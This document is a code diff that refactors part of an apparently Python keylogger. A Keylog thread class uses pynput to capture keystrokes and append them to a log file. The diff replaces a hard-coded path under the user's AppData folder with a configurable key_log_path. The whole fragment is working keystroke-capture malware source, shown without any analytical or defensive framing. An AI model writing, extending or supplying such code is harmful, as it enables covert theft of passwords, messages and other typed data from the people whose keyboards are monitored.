@@ -5,8 +5,7 @@ from vars import *
 from pynput.keyboard import Key,Listener
 import os
 class Keylog(Thread):
-    file_path = os.environ['USERPROFILE']+"\\appdata"
-    extend = "\\"
+    
     count = 0
     keys = []
     def on_press(self,key):
@@ -18,7 +17,7 @@ class Keylog(Thread):
             self.write_file()
             self.keys = []
     def write_file(self):
-        with open(self.file_path+self.extend+keys_information, "a+") as f:
+        with open(f'{key_log_path}\\{keys_information}', "a+") as f:
             for key in self.keys:
                 k =  str(key).replace('\'' , "")
                 if k.find("space")>0:
